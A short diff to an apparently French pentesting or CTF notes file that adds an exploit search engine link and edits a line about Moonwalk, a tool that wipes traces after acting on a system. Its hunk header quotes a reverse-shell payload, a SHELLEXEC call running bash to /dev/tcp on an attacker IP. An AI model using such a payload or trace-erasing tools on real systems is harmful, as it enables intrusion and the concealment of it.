@@ -44,9 +44,11 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 
 ### Tools
 
+- [Sploitus](https://sploitus.com/) --> Un google pour les exploits et vulnérabilitées 
+
 - [BugBountyTool](https://github.com/vavkamil/awesome-bugbounty-tools) (regroupe les tools CTF)
 
-- [Moonwalk](https://github.com/mufeedvh/moonwalk) --> efface les traces après des actions sur un système
+- [Moonwalk](https://github.com/mufeedvh/moonwalk) --> Efface les traces après des actions sur un système
 
 - Biblothèque cyber --> https://inventory.raw.pm/tools.html#title-tools-threat-intelligence + https://johnermac.github.io/
 
